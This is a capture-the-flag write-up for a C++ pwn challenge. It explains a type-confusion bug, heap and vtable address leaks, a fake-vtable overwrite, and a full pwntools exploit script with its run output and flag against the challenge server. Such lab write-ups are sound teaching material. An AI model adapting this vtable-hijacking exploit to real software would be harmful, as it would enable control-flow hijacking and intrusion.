# Ekusher Shobdo

## Challenge info

- **Name:** Ekusher Shobdo
- **Category:** Pwn / C++
- **Author:** NomanProdhan

The challenge provides a menu-based C++ program for storing different kinds of archive records, including poems, slogans, notices, broadcasts, and imported archives.

The main weakness comes from how the program handles record types. It lets us change the classification of a record without replacing the actual C++ object behind it.

That mismatch gives us a type-confusion bug and, eventually, control over a virtual function call.

## First look

The program exposes a few useful actions:

- create a record
- edit a record
- reclassify a record
- display metadata
- publish a record

Since the binary is written in C++, the different record types are implemented using classes with virtual methods.

The internal slot structure looks roughly like this:

```cpp
struct Slot {
    Record *storage;
    int classification;
};
```

The `storage` pointer refers to the real C++ object allocated on the heap.

The `classification` field is only an integer that tells the program which type of record it should treat the object as.

The problem is that these two values can become inconsistent.

## The type-confusion bug

When a record is reclassified, the program only changes the `classification` field.

It does not destroy the existing object or allocate a new object of the selected class.

That means we can:

1. Create a normal `Poem` object.
2. Reclassify it as an imported archive.
3. Use the imported archive editor on the original `Poem` object.

The imported archive editor accepts raw bytes encoded as hexadecimal and copies the decoded data directly into the object.

This gives us an arbitrary overwrite starting from the beginning of the heap allocation.

For a C++ object with virtual methods, the first eight bytes usually contain the vtable pointer:

```text
object + 0x00 -> vtable pointer
```

So the overwrite gives us direct control over the object's virtual dispatch.

## Information leaks

The metadata option prints values similar to:

```text
storage=0x5cc0627ae2b0
dispatch=0x5cc0367b7c08
```

The `storage` value is the address of the heap object.

The `dispatch` value is the object's current vtable address.

From reversing the local binary, the `Poem` vtable is located at:

```text
PIE base + 0x4c08
```

So the PIE base can be recovered with:

```python
pie_base = dispatch - 0x4c08
```

The binary also contains a hidden function that reads `flag.txt` and prints its contents. That function is located at:

```text
PIE base + 0x1dd0
```

Its runtime address can therefore be calculated with:

```python
flag_function = pie_base + 0x1dd0
```

At this point, we know:

- the address of the heap object
- the PIE base of the binary
- the address of the hidden flag function

That is everything needed to build the exploit.

## Building a fake vtable

The publish option eventually performs a virtual call similar to:

```cpp
record->publish();
```

The function pointer used for `publish()` is loaded from:

```text
[vtable + 0x08]
```

Since we can overwrite the object and know its heap address, we can place a fake vtable inside the object itself.

The payload uses this layout:

```text
object + 0x00: object + 0x08
object + 0x08: 0
object + 0x10: hidden flag function
```

The first qword replaces the original vtable pointer and points to:

```text
object + 0x08
```

That location becomes our fake vtable.

The entry at fake vtable offset `0x08` is stored at `object + 0x10`, so it is replaced with the address of the hidden flag routine.

The resulting object looks like this:

```text
heap object
+--------------------------+
| fake vtable pointer      | object + 0x00
| points to object + 0x08  |
+--------------------------+
| unused fake entry        | object + 0x08
| 0x0000000000000000       |
+--------------------------+
| fake publish entry       | object + 0x10
| hidden flag function     |
+--------------------------+
```

After the overwrite, calling `publish()` no longer reaches the real poem method.

Instead, the virtual dispatch lands inside the hidden function that prints the flag.

## Exploit

```python
#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF("./ekusher_shobdo", checksec=False)
context.log_level = "info"

def start():
    if args.REMOTE:
        return remote("45.56.67.129", 54821)

    return process(elf.path)

io = start()

def menu(choice):
    io.sendlineafter(b"> ", str(choice).encode())

# Create record 0 as a poem.
menu(1)
io.sendlineafter(b"Type: ", b"1")

# Leak the heap object and the poem vtable.
menu(5)
io.sendlineafter(b"Record: ", b"0")

io.recvuntil(b"storage=")
storage = int(io.recvline().strip(), 16)

io.recvuntil(b"dispatch=")
dispatch = int(io.recvline().strip(), 16)

# Recover the PIE base and hidden flag routine.
pie_base = dispatch - 0x4C08
flag_routine = pie_base + 0x1DD0

log.info(f"storage      = {storage:#x}")
log.info(f"dispatch     = {dispatch:#x}")
log.info(f"PIE base     = {pie_base:#x}")
log.info(f"flag routine = {flag_routine:#x}")

# Change only the external classification.
# The actual heap object is still a Poem.
menu(3)
io.sendlineafter(b"Record: ", b"0")
io.sendlineafter(b"New classification: ", b"5")

# The imported archive editor writes decoded bytes
# directly over the original C++ object.
menu(2)
io.sendlineafter(b"Record: ", b"0")
io.recvuntil(b"Raw bytes (hex): ")

fake_vtable = storage + 8

payload = flat(
    fake_vtable,
    0,
    flag_routine,
)

io.sendline(payload.hex().encode())

# The virtual publish call now reaches the hidden function.
menu(6)
io.sendlineafter(b"Record: ", b"0")

io.recvuntil(b"[+] The language broadcast has been restored.\n")
flag = io.recvline().strip()

if not (flag.startswith(b"BDSEC{") and flag.endswith(b"}")):
    raise RuntimeError(f"unexpected output: {flag!r}")

log.success(flag.decode())
```

The exploit can be run against the remote service with:

```bash
python3 exploit.py REMOTE
```

## Output

```text
[+] Opening connection to 45.56.67.129 on port 54821: Done
[*] storage      = 0x5cc0627ae2b0
[*] dispatch     = 0x5cc0367b7c08
[*] PIE base     = 0x5cc0367b3000
[*] flag routine = 0x5cc0367b4dd0
[+] BDSEC{sh0bd0_k0kh0n0_b0nd1_th4k3_n4}
[*] Closed connection to 45.56.67.129 port 54821
```

## Flag

```text
BDSEC{sh0bd0_k0kh0n0_b0nd1_th4k3_n4}
```

## Final thoughts

This was a fun C++ type-confusion challenge.

The core issue was that the program trusted the external classification field instead of the real type of the object stored on the heap. Once a `Poem` could be edited through the imported archive path, the object's vtable pointer became fully controllable.

The metadata leak made the remaining steps straightforward. The heap address gave us a place to store the fake vtable, while the original vtable address revealed the PIE base.

From there, the exploit only needed to replace the `publish()` entry with the hidden flag routine and trigger the virtual call.
